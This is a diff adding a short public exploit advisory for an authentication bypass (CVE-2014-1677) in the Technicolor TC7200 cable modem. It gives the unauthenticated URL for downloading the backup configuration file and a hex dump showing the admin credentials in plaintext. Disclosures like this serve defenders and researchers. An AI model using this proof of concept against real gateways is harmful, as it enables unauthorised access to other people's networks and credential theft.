@@ -1,0 +1,31 @@
+# Exploit Title: Technicolor TC7200: Authentication Bypass
+# Google Dork: N/A
+# Date: 24-02-2014
+# Exploit Author: Jeroen - IT Nerdbox
+# Vendor Homepage: http://www.technicolor.com/
+# Software Link: http://www.technicolor.com/en/solutions-services/connected-home/modems-gateways/cable-modems-gateways/tc7200-tc7300
+# Version: STD6.01.12
+# Tested on: N/A
+# CVE : CVE-2014-1677
+#
+
+## Description:
+#
+# Any user on the internal network can download a backup configuration file without authenticating first. The backup file contains
+# the credentials to the administrative web interface.
+#
+## PoC:
+#
+# Download the file: http://192.168.0.1/goform/system/GatewaySettings.bin
+# 
+# Using the command: $ hexedit -C GatewaySettings.bin
+#
+# 00006590  00 00 00 00 00 00 00 00  30 4d 4c 6f 67 00 06 00 |........0MLog...|
+# 000065a0  05 61 64 6d 69 6e 00 15  6d 79 73 75 70 65 72 73 |.admin..mysupers|
+# 000065b0  65 63 72 65 74 70 61 73  73 77 6f 72 64 00 06 75 |ecretpassword..u|
+# 000065c0  70 63 63 73 72 00 00                             |pccsr..|
+# 000065c7
+#
+# 
+
+# More information can be found at:http://www.nerdbox.it/technicolor-tc7200-auth-bypass-dos/
